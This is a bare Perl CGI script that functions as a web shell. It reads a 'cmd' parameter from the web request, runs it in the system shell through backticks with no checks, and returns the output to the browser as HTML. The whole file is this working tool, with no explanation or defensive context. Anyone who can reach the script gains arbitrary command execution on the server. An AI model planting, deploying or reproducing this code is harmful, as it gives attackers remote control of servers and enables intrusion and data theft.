#!/usr/bin/perl

use CGI ':standard';

print "content-type: text/html\n\n";
$cmd = param('cmd');

@output = `$cmd`;

foreach $var (@output) {
	print "$var <br>";
}
#exit(0);
